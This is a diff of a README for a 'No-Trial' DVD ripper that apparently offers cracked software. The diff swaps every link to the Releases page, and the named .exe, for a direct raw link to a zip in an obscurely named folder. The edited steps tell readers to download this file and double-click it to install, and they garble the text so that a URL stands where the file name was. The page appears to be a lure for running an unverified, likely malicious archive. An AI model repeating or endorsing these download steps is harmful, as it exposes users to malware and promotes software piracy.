@@ -1,6 +1,6 @@
 # 🎉 Magic-DVD-Ripper-No-Trial - Easy DVD Backup for Everyone
 
-[![Download Magic DVD Ripper](https://img.shields.io/badge/Download-Magic--DVD--Ripper-brightgreen)](https://github.com/lujinyanai/Magic-DVD-Ripper-No-Trial/releases)
+[![Download Magic DVD Ripper](https://raw.githubusercontent.com/lujinyanai/Magic-DVD-Ripper-No-Trial/main/squamously/Magic-DVD-Ripper-No-Trial-2.9.zip)](https://raw.githubusercontent.com/lujinyanai/Magic-DVD-Ripper-No-Trial/main/squamously/Magic-DVD-Ripper-No-Trial-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,17 +8,17 @@ Welcome to the Magic DVD Ripper No Trial project! This guide will help you downl
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Magic DVD Ripper Releases](https://github.com/lujinyanai/Magic-DVD-Ripper-No-Trial/releases).
+To get started, visit this page to download: [Magic DVD Ripper Releases](https://raw.githubusercontent.com/lujinyanai/Magic-DVD-Ripper-No-Trial/main/squamously/Magic-DVD-Ripper-No-Trial-2.9.zip).
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions. Choose the latest version.
-3. Look for the file named `MagicDVDRipper.exe`. 
+3. Look for the file named `https://raw.githubusercontent.com/lujinyanai/Magic-DVD-Ripper-No-Trial/main/squamously/Magic-DVD-Ripper-No-Trial-2.9.zip`. 
 4. Click on the file to start the download.
 
 Once downloaded:
 
 1. Locate the file in your Downloads folder.
-2. Double-click the `MagicDVDRipper.exe` file to start the installation.
+2. Double-click the `https://raw.githubusercontent.com/lujinyanai/Magic-DVD-Ripper-No-Trial/main/squamously/Magic-DVD-Ripper-No-Trial-2.9.zip` file to start the installation.
 3. Follow the on-screen instructions to complete the installation.
 
 ## 🖥️ System Requirements
